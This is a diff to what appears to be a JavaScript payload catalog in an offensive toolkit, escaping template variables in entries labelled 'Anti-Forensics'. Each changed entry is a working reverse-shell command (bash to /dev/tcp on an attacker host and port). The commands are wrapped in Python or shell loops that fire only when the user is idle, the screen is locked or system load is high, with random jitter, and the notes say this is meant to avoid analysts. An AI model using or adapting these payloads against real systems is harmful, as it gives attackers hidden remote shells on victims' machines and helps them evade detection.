@@ -621,13 +621,13 @@ while True:
         break
     jitter=180+int(__import__('random').random()*420)
     time.sleep(jitter)
-" 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
+" 'bash -i >& /dev/tcp/\${lhost}/\${lport} 0>&1'`,
       notes: "Polls who + w to detect logged-in users. Executes payload only when workstation appears idle (no active sessions). Polls with 3-10 minute random jitter. Avoids execution during analyst investigation hours.",
     },
     {
       id: "activity_sleep_xscreensaver", name: "X screensaver idle detection — exec on screen-lock", category: "Anti-Forensics",
       os: "linux", phase: "pre", stealth: 5,
-      command: `_CMD="bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"; while true; do _IDLE=$(xprintidle 2>/dev/null || echo 0); if [ "$_IDLE" -gt 300000 ] 2>/dev/null; then (bash -c "$_CMD" 2>/dev/null &); break; fi; _JIT=$((180+RANDOM%420)); sleep $_JIT; done &`,
+      command: `_CMD="bash -i >& /dev/tcp/\${lhost}/\${lport} 0>&1"; while true; do _IDLE=$(xprintidle 2>/dev/null || echo 0); if [ "$_IDLE" -gt 300000 ] 2>/dev/null; then (bash -c "$_CMD" 2>/dev/null &); break; fi; _JIT=$((180+RANDOM%420)); sleep $_JIT; done &`,
       notes: "xprintidle returns X11 idle time in ms. Triggers payload when idle > 300s (5 min). Uses background loop with 3-10min jitter. Fires when user locks screen or walks away.",
     },
     {
@@ -640,7 +640,7 @@ def _load():
         with open('/proc/loadavg') as f:
             return float(f.read().split()[0])
     except: return 0.0
-cmd='bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'
+cmd='bash -i >& /dev/tcp/\${lhost}/\${lport} 0>&1'
 while True:
     load=_load()
     if load > 1.5:
